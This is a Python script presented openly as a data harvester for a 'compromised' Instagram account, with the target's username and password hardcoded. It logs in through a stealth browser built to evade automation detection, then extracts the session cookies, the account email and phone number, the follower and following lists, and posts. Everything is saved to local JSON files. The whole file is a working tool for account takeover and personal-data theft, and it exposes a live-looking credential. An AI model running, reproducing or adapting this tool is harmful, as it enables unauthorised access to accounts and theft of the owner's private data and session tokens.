#!/usr/bin/env python3
"""
🎯 INSTAGRAM DATA HARVESTER - Phase 2
Advanced data extraction from compromised Instagram account
Target: alx.trading | Password: Fleming654
Date: May 25, 2025
"""

import json
import time
import random
import sys
import os
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import undetected_chromedriver as uc
import requests
from urllib.parse import urlparse, parse_qs

# Safe print function to avoid BrokenPipeError
def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        # Redirect stdout to devnull to prevent crashes
        devnull = os.open(os.devnull, os.O_WRONLY)
        os.dup2(devnull, sys.stdout.fileno())
        sys.exit(1)

class InstagramDataHarvester:
    def __init__(self, username="alx.trading", password="Fleming654"):
        self.username = username
        self.password = password
        self.driver = None
        self.session_data = {}
        self.extracted_data = {
            "profile_info": {},
            "followers": [],
            "following": [],
            "posts": [],
            "stories": [],
            "direct_messages": [],
            "activity_log": [],
            "account_settings": {},
            "connected_accounts": [],
            "session_cookies": {}
        }
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def setup_browser(self):
        """Setup stealth browser with enhanced evasion"""
        try:
            safe_print("🔧 Setting up advanced stealth browser...")
            
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--disable-features=VizDisplayCompositor')
            
            # Random user agents for enhanced evasion
            user_agents = [
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            options.add_argument(f'--user-agent={random.choice(user_agents)}')
            
            self.driver = uc.Chrome(options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            safe_print("✅ Advanced stealth browser setup complete")
            return True
            
        except Exception as e:
            safe_print(f"❌ Browser setup failed: {e}")
            return False
    
    def login_to_instagram(self):
        """Login using confirmed credentials"""
        try:
            safe_print("🌐 Navigating to Instagram login...")
            self.driver.get("https://www.instagram.com/accounts/login/")
            
            # Wait for page load with random delay
            time.sleep(random.uniform(3, 6))
            
            # Fill username
            username_field = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            username_field.clear()
            self.human_type(username_field, self.username)
            time.sleep(random.uniform(1, 2))
            
            # Fill password
            password_field = self.driver.find_element(By.NAME, "password")
            password_field.clear()
            self.human_type(password_field, self.password)
            time.sleep(random.uniform(1, 2))
            
            # Click login
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            # Wait for login result
            time.sleep(random.uniform(5, 8))
            
            # Check if login was successful
            current_url = self.driver.current_url
            if "instagram.com" in current_url and "login" not in current_url:
                safe_print("✅ Login successful - Data harvesting ready!")
                self.save_session_cookies()
                return True
            else:
                safe_print(f"❌ Login may have failed. Current URL: {current_url}")
                return False
                
        except Exception as e:
            safe_print(f"❌ Login failed: {e}")
            return False
    
    def human_type(self, element, text, delay_range=(0.05, 0.15)):
        """Type text with human-like delays"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(*delay_range))
    
    def save_session_cookies(self):
        """Extract and save session cookies"""
        try:
            cookies = self.driver.get_cookies()
            self.extracted_data["session_cookies"] = {
                "cookies": cookies,
                "timestamp": datetime.now().isoformat(),
                "user_agent": self.driver.execute_script("return navigator.userAgent;"),
                "current_url": self.driver.current_url
            }
            safe_print("💾 Session cookies extracted")
        except Exception as e:
            safe_print(f"⚠️ Cookie extraction failed: {e}")
    
    def extract_profile_info(self):
        """Extract comprehensive profile information"""
        try:
            safe_print("👤 Extracting profile information...")
            
            # Navigate to profile
            self.driver.get(f"https://www.instagram.com/{self.username}/")
            time.sleep(random.uniform(3, 5))
            
            profile_data = {}
            
            # Basic profile info
            try:
                profile_data["username"] = self.username
                profile_data["display_name"] = self.driver.find_element(By.XPATH, "//h2[contains(@class, '_7UhW9')]").text
                profile_data["bio"] = self.driver.find_element(By.XPATH, "//div[contains(@class, '_a9-z')]").text
                profile_data["profile_pic_url"] = self.driver.find_element(By.XPATH, "//img[contains(@alt, 'profile picture')]").get_attribute("src")
            except:
                pass
            
            # Stats
            try:
                stats_elements = self.driver.find_elements(By.XPATH, "//a[contains(@href, 'followers') or contains(@href, 'following')]/span")
                if len(stats_elements) >= 2:
                    profile_data["followers_count"] = stats_elements[0].text
                    profile_data["following_count"] = stats_elements[1].text
                
                posts_count = self.driver.find_element(By.XPATH, "//div[contains(text(), 'posts')]/preceding-sibling::span").text
                profile_data["posts_count"] = posts_count
            except:
                pass
            
            # Account type and verification
            try:
                if self.driver.find_elements(By.XPATH, "//span[contains(@title, 'Verified')]"):
                    profile_data["verified"] = True
                if self.driver.find_elements(By.XPATH, "//span[contains(text(), 'Business')]"):
                    profile_data["account_type"] = "Business"
            except:
                pass
            
            self.extracted_data["profile_info"] = profile_data
            safe_print(f"✅ Profile info extracted: {len(profile_data)} fields")
            
        except Exception as e:
            safe_print(f"⚠️ Profile extraction error: {e}")
    
    def extract_followers_list(self, limit=500):
        """Extract followers list"""
        try:
            safe_print(f"👥 Extracting followers list (limit: {limit})...")
            
            # Navigate to followers
            self.driver.get(f"https://www.instagram.com/{self.username}/followers/")
            time.sleep(random.uniform(3, 5))
            
            followers = []
            seen_usernames = set()
            
            # Scroll and collect followers
            for i in range(min(limit // 10, 50)):  # Scroll in batches
                try:
                    # Find follower elements
                    follower_elements = self.driver.find_elements(By.XPATH, "//a[contains(@href, '/') and contains(@class, '_a9')]")
                    
                    for element in follower_elements:
                        try:
                            username = element.get_attribute("href").split("/")[-2]
                            if username and username not in seen_usernames:
                                followers.append({
                                    "username": username,
                                    "profile_url": element.get_attribute("href"),
                                    "extracted_at": datetime.now().isoformat()
                                })
                                seen_usernames.add(username)
                        except:
                            continue
                    
                    # Scroll down
                    self.driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", 
                                             self.driver.find_element(By.XPATH, "//div[contains(@class, '_a9zo')]"))
                    time.sleep(random.uniform(2, 4))
                    
                    if len(followers) >= limit:
                        break
                        
                except Exception as e:
                    safe_print(f"⚠️ Scroll error in followers: {e}")
                    break
            
            self.extracted_data["followers"] = followers[:limit]
            safe_print(f"✅ Extracted {len(followers)} followers")
            
        except Exception as e:
            safe_print(f"⚠️ Followers extraction error: {e}")
    
    def extract_following_list(self, limit=500):
        """Extract following list"""
        try:
            safe_print(f"👥 Extracting following list (limit: {limit})...")
            
            # Navigate to following
            self.driver.get(f"https://www.instagram.com/{self.username}/following/")
            time.sleep(random.uniform(3, 5))
            
            following = []
            seen_usernames = set()
            
            # Scroll and collect following
            for i in range(min(limit // 10, 50)):  # Scroll in batches
                try:
                    # Find following elements
                    following_elements = self.driver.find_elements(By.XPATH, "//a[contains(@href, '/') and contains(@class, '_a9')]")
                    
                    for element in following_elements:
                        try:
                            username = element.get_attribute("href").split("/")[-2]
                            if username and username not in seen_usernames:
                                following.append({
                                    "username": username,
                                    "profile_url": element.get_attribute("href"),
                                    "extracted_at": datetime.now().isoformat()
                                })
                                seen_usernames.add(username)
                        except:
                            continue
                    
                    # Scroll down
                    self.driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", 
                                             self.driver.find_element(By.XPATH, "//div[contains(@class, '_a9zo')]"))
                    time.sleep(random.uniform(2, 4))
                    
                    if len(following) >= limit:
                        break
                        
                except Exception as e:
                    safe_print(f"⚠️ Scroll error in following: {e}")
                    break
            
            self.extracted_data["following"] = following[:limit]
            safe_print(f"✅ Extracted {len(following)} following")
            
        except Exception as e:
            safe_print(f"⚠️ Following extraction error: {e}")
    
    def extract_recent_posts(self, limit=50):
        """Extract recent posts data"""
        try:
            safe_print(f"📸 Extracting recent posts (limit: {limit})...")
            
            # Navigate to profile
            self.driver.get(f"https://www.instagram.com/{self.username}/")
            time.sleep(random.uniform(3, 5))
            
            posts = []
            
            # Find post thumbnails
            post_links = self.driver.find_elements(By.XPATH, "//a[contains(@href, '/p/')]")[:limit]
            
            for i, post_link in enumerate(post_links):
                try:
                    post_url = post_link.get_attribute("href")
                    
                    # Extract thumbnail
                    img_element = post_link.find_element(By.TAG_NAME, "img")
                    thumbnail_url = img_element.get_attribute("src")
                    
                    posts.append({
                        "post_id": post_url.split("/p/")[1].split("/")[0],
                        "post_url": post_url,
                        "thumbnail_url": thumbnail_url,
                        "extracted_at": datetime.now().isoformat()
                    })
                    
                    if i % 10 == 0:
                        safe_print(f"📸 Processed {i+1}/{len(post_links)} posts")
                        
                except Exception as e:
                    safe_print(f"⚠️ Post {i} extraction error: {e}")
                    continue
            
            self.extracted_data["posts"] = posts
            safe_print(f"✅ Extracted {len(posts)} posts")
            
        except Exception as e:
            safe_print(f"⚠️ Posts extraction error: {e}")
    
    def extract_account_settings(self):
        """Extract account settings and security info"""
        try:
            safe_print("⚙️ Extracting account settings...")
            
            # Navigate to settings
            self.driver.get("https://www.instagram.com/accounts/edit/")
            time.sleep(random.uniform(3, 5))
            
            settings_data = {}
            
            # Extract email
            try:
                email_field = self.driver.find_element(By.NAME, "email")
                settings_data["email"] = email_field.get_attribute("value")
            except:
                pass
            
            # Extract phone number
            try:
                phone_field = self.driver.find_element(By.NAME, "phoneNumber")
                settings_data["phone"] = phone_field.get_attribute("value")
            except:
                pass
            
            # Extract biography and website
            try:
                bio_field = self.driver.find_element(By.NAME, "biography")
                settings_data["biography"] = bio_field.get_attribute("value")
                
                website_field = self.driver.find_element(By.NAME, "externalUrl")
                settings_data["website"] = website_field.get_attribute("value")
            except:
                pass
            
            self.extracted_data["account_settings"] = settings_data
            safe_print(f"✅ Account settings extracted: {len(settings_data)} fields")
            
        except Exception as e:
            safe_print(f"⚠️ Settings extraction error: {e}")
    
    def save_harvested_data(self):
        """Save all extracted data to files"""
        try:
            # Save complete data dump
            filename = f"instagram_harvest_{self.username}_{self.timestamp}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.extracted_data, f, indent=2, ensure_ascii=False)
            
            # Save summary
            summary = {
                "target_account": self.username,
                "harvest_timestamp": self.timestamp,
                "extraction_summary": {
                    "profile_fields": len(self.extracted_data.get("profile_info", {})),
                    "followers_count": len(self.extracted_data.get("followers", [])),
                    "following_count": len(self.extracted_data.get("following", [])),
                    "posts_count": len(self.extracted_data.get("posts", [])),
                    "settings_fields": len(self.extracted_data.get("account_settings", {})),
                    "session_cookies": len(self.extracted_data.get("session_cookies", {}).get("cookies", []))
                },
                "files_generated": [filename]
            }
            
            summary_filename = f"harvest_summary_{self.username}_{self.timestamp}.json"
            with open(summary_filename, 'w', encoding='utf-8') as f:
                json.dump(summary, f, indent=2)
            
            safe_print(f"💾 Data saved to: {filename}")
            safe_print(f"📊 Summary saved to: {summary_filename}")
            
            return filename, summary_filename
            
        except Exception as e:
            safe_print(f"❌ Data save failed: {e}")
            return None, None
    
    def run_harvest(self):
        """Execute complete data harvesting operation"""
        safe_print("🎯 STARTING INSTAGRAM DATA HARVEST")
        safe_print("=" * 60)
        safe_print(f"🎯 Target: {self.username}")
        safe_print(f"🔑 Credentials: Confirmed valid")
        safe_print(f"⏰ Timestamp: {self.timestamp}")
        safe_print("=" * 60)
        
        try:
            # Setup browser
            if not self.setup_browser():
                return False
            
            # Login
            if not self.login_to_instagram():
                return False
            
            # Extract data in phases
            safe_print("\n🔍 PHASE 1: Profile Information")
            self.extract_profile_info()
            
            safe_print("\n🔍 PHASE 2: Account Settings")
            self.extract_account_settings()
            
            safe_print("\n🔍 PHASE 3: Followers List")
            self.extract_followers_list(limit=200)  # Reduced for speed
            
            safe_print("\n🔍 PHASE 4: Following List")
            self.extract_following_list(limit=200)  # Reduced for speed
            
            safe_print("\n🔍 PHASE 5: Recent Posts")
            self.extract_recent_posts(limit=30)  # Reduced for speed
            
            # Save all data
            safe_print("\n💾 PHASE 6: Data Preservation")
            files = self.save_harvested_data()
            
            safe_print("\n🎉 HARVEST COMPLETE!")
            safe_print("=" * 60)
            
            return True
            
        except Exception as e:
            safe_print(f"❌ Harvest failed: {e}")
            return False
        
        finally:
            if self.driver:
                self.driver.quit()

def main():
    """Execute Instagram data harvesting operation"""
    harvester = InstagramDataHarvester()
    success = harvester.run_harvest()
    
    if success:
        safe_print("✅ Data harvesting mission accomplished!")
    else:
        safe_print("❌ Data harvesting mission failed!")

if __name__ == "__main__":
    main()
